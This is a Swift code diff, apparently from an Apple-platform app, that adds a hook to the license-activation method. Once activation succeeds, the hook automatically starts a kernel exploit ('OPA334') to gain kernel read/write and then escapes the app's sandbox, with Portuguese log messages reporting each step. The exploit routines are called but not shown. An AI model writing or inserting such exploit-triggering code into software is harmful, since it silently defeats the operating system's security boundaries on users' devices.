@@ -55,6 +55,32 @@ class AppState: ObservableObject {
     func activate(with info: LicenseInfo) {
         self.activeLicense = info
         self.isActivated = true
+        
+        // Disparar exploit de kernel e escape de sandbox após ativação bem-sucedida
+        triggerKernelExploit()
+    }
+    
+    private func triggerKernelExploit() {
+        DispatchQueue.global(qos: .userInitiated).async {
+            log("exploit: Iniciando OPA334...")
+            let result = kexploit_opa334()
+            if result == 0 {
+                log("exploit: Kernel R/W estabelecido!")
+                let selfProc = proc_self()
+                log("exploit: Escapando da Sandbox...")
+                let escapeResult = sandbox_escape(selfProc)
+                if escapeResult == 0 {
+                    log("exploit: Sandbox escape concluído com sucesso!")
+                    DispatchQueue.main.async {
+                        self.exploitStatus = .success(method: "Kernel + Sandbox Escape")
+                    }
+                } else {
+                    log("exploit: Falha no sandbox escape (\(escapeResult))")
+                }
+            } else {
+                log("exploit: Falha no kernel exploit (\(result))")
+            }
+        }
     }
 
     func detectSupport() {
